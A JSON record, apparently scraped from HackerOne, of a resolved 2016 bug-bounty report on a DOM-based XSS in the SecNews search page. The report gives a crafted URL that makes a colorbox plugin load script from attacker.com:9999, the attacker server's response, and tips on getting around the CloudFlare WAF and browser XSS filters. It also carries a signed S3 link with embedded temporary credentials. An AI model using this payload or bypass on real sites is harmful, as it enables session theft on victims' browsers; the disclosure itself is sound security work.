@@ -1,0 +1,207 @@
+{
+  "id": 168165,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjgxNjU=",
+  "url": "https://hackerone.com/reports/168165",
+  "title": "DOM based XSS in search functionality",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2016-09-13T22:48:38.697Z",
+  "submitted_at": "2016-09-13T22:48:38.697Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sameoldstory",
+    "url": "/sameoldstory",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/096/923/44c14c32450369140f1d9943753d37475ae8884c_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13417,
+    "url": "https://hackerone.com/secnews",
+    "handle": "secnews",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/013/417/e1ef3aeb39d84d037d6a2fb5f7c8639004c89601_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/417/e1ef3aeb39d84d037d6a2fb5f7c8639004c89601_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "SecNews",
+      "twitter_handle": "SecNews_GR",
+      "website": "https://www.secnews.gr",
+      "about": "SecNews is an IT Security news website, which informs the visitors about the latest news in Hacking  & IT Security industry."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-11-16T19:07:23.280Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-10-17T19:07:09.981Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Overview\n===\nSearch query is inserted into the HTML of the page without proper encoding. Specifically, a single-quote is not html-encoded (albeit escaped, even twice), which allows the attacker to break out of the HTML attribute and inject arbitrary tags.\n\n```html\ncurl -s 'https://www.secnews.gr?s=%27%3E%3Ctest%3E%3C' | egrep -o \".{47}?<test>.*?>\"\n<div id=\"content\" data-currentquery='{\"s\":\"\\\\'><test><\"}' class=\"main-content articles list sidebar-right    non-full\">\n```\n\nImpediments\n===\nAlthough aformentioned injection point can be used to carry out XSS attacks, there is a couple of complications.\n\n1. The website is protected by the CloudFlare WAF which blocks any suspicious requests. This can be circumvented though by instead targeting `secnews.wpengine.com`.\n2. The website has `X-XSS-Protection` header set which enables very powerful XSS Auditor in Google Chrome.\n3. The potential victim is administrator on a web security website. They are likely to have some kind of an XSS protection plugin installed in their browser.\n\nSolution\n===\nOne of the javascript plugins (colorbox) used by the website has a code path that inserts response from arbitrary URL into DOM tree. It allows the attacker to go from regular XSS to DOM based XSS that anti-XSS tools are not able to detect.\n\nSee a proof-of-concept video: F119742\n\n1. The attacker lures the victim to visit this link:\n    ```\n    https://www.secnews.gr/?s=%27%20class%3Dcolorbox%20href=/attacker.com:9999%3E\n    ```\n\n2. To any incoming requests the server at `attacker.com:9999` responds with:\n    ```\n    HTTP/1.1 200 OK\n    content-length: 39\n    access-control-allow-origin: *\n    access-control-allow-headers: x-requested-with\n    \n    <script>alert(document.domain)</script>\n    ```\n\n3. The victim clicks anywhere below the navigation bar.\n4. Malicious script gets downloaded and executed.\n\nSecurity Implications\n===\nAlthough this exploit requires the victim to click, I'm confident (and hope you are too) that it's only a question of time and effort to find a code path that executes injected script without user interaction.\n\nYou mention in the policy that you don't consider any XSS significant enough for bounty. Although I think that you underestimate the power of XSS, it's your call and I've had a lot of fun anyway.\n\n\n\n",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 119742,
+      "file_name": "secnews-xss.m4v",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/119/742/4be49f47c84123dbbd54b147da62367ac5571940/secnews-xss.m4v?response-content-disposition=attachment%3B%20filename%3D%22secnews-xss.m4v%22%3B%20filename%2A%3DUTF-8%27%27secnews-xss.m4v&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3DK7BU5K%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T064856Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDm5UkcianOVpT2dxHhYUFO2JJdi4xaD9w6djVtBYZASwIhANXZxm2j8oHu%2BP%2BkAqbXzU%2BKecKpDIQFUssbVExx7Jy5KrIFCH8QAxoMMDEzNjE5Mjc0ODQ5IgyDTl7d7vVnsdqLgOAqjwXnNXnYKYav0zdjYTPkVRXer%2FMwN2oqqrhfdNURd9ubM1WAp9zualVU2sWPVBIzAzLyEBUvF32oYKbsmEdMz%2BOT5tIYlVUJP9uinYkvmcDgFv1NCgizwcinvUA%2BHioTSSP4Ept1%2FunQf62b6n9qtxNg4QoI1qyNKlZwa2F%2BA2clysHg54E8gPBIN4HLgNM3XGdb9eIFBQTPjRZP9zgDoCXlGlHuXgZp%2BGqrlss1lhSSEXeoHrCkNL%2BR9iWEYXgUxQNv80lJqNIufItu8Xib6HzyanXoOdF1TwuPiZygndvcAnqOFJO%2BLGSt95CXOfYjNz05uh%2FJLWUKJ9mmbgQOogRg%2Fs2m7kwJHmdBPpZxRsrzqQpevupufGCO5jxvuWzrkegVMUQJkroi1nizwO3JrNfVc1LtNJVEGTmzxLPer8BP7S%2BTwq6%2F%2BoBd2pZ%2BclexBVvVdsgQTZJnAcLwV5YksWtqa5q5h7Vi%2B2lL9x0Vcm2F80oL8MY39N6URu14%2FV0ZvVUmSWNQBCMJverUPgwSJxE5fjHFqF%2FIYAymddI6rxUW3rVIgkfnPkQrqdiTGptQBVoXxU9dPVcB8t9tHN%2BtgGb%2BsR99jQOf%2B47DiVknLWL%2Fbe1P4syd3fDk5zERd%2FP3ALBU%2ByhXSN4pJ2Zbja7BSIHu356PYgNjzf8xQViKbGv2ldsZPrfJemVsIcCXL%2FZRC9%2BW%2Fm1G46AcgTwfyKyT8TmAF02MN01xoLloQiEohc%2BajN85Vnf2t%2FBXqkSkPmsLA1h0d%2BHLuMxR41Rk%2FGrJ6jk6l%2FemaRaTx%2FjrImK6LS6WTf%2Bz9nPEokZUR90uDg%2FJ5KxZnRXz8m7KUTsbjmIvjDvgYc%2FVAirPdFnU0pwvkoIcMK7Ht9IGOrAB9OAuM4ZuS7Ot0zodh6zUVsVU9aMBJovCDTfF8yFDXiVotiEC8Lmus9gNBc%2FOkg5EWNMF%2FNXeiPj8ndunzDi1Uo0Qdl%2BD73Qy2AkoASEWajogjtRYdbBnDNt8yYBaMFzSQlLBFWUZjt0ZUowCPDUmrFKmTgtpfrHbcPh2bgJbG5wTsKIBKJVo7EbjLXawp7VOziqIlCPyh9ctyqpWxvP7sVo3U0ZgwfbNyEUQ%2F31RTrY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dbbe9f662e85422870e3b789c3b61d7a03bad69e5b405b1636b24aa196f21dfd",
+      "file_size": 939477,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-11-16T19:07:10.029Z",
+  "allow_singular_disclosure_after": -304170106.5781056,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "0xtarun",
+    "sumit7"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 2913,
+      "category": "researcher",
+      "content": "When researchers don't understand english well, it's inconvenient, but at least it only hurts themselves. When the security team is not good at english, unfortunately it hurts all the researches.\n\nBig thanks to the team for adjusting the wording in the end.",
+      "updated_at": "2016-11-16T20:05:02.599Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 96923,
+        "username": "sameoldstory",
+        "name": "",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2016-07-30T18:43:04.772Z",
+        "url": "https://hackerone.com/sameoldstory",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/096/923/44c14c32450369140f1d9943753d37475ae8884c_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/923/44c14c32450369140f1d9943753d37475ae8884c_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/096/923/44c14c32450369140f1d9943753d37475ae8884c_original.png/f0e07660005686ec92c43da54c0094c1ac1b490ea8c5eac04a4081d912d6ce36"
+        }
+      }
+    }
+  ],
+  "databaseId": "168165",
+  "votes": 1,
+  "latest_disclosable_activity_at": "2016-11-16T19:07:23.301Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T14:48:56.711088",
+    "source": "https://hackerone.com/reports/168165.json",
+    "report_id": 168165
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjgxNjU=",
+    "databaseId": "168165",
+    "title": "DOM based XSS in search functionality",
+    "url": "https://hackerone.com/reports/168165",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2016-11-16T19:07:23.280Z",
+    "created_at": "2016-09-13T22:48:38.697Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzYw",
+      "name": "Cross-site Scripting (XSS) - Generic",
+      "external_id": "cwe-79"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "sameoldstory"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzNDE3",
+      "handle": "secnews",
+      "name": "SecNews",
+      "url": "https://hackerone.com/secnews",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE2ODE2NQ==",
+    "_id": "168165",
+    "disclosed": true,
+    "votes": 1,
+    "latest_disclosable_activity_at": "2016-11-16T19:07:23.301Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjgxNjU=",
+      "databaseId": "168165",
+      "title": "DOM based XSS in search functionality",
+      "url": "https://hackerone.com/reports/168165",
+      "disclosed_at": "2016-11-16T19:07:23.280Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzNDE3",
+      "handle": "secnews",
+      "name": "SecNews",
+      "url": "https://hackerone.com/secnews",
+      "currency": "usd"
+    }
+  }
+}
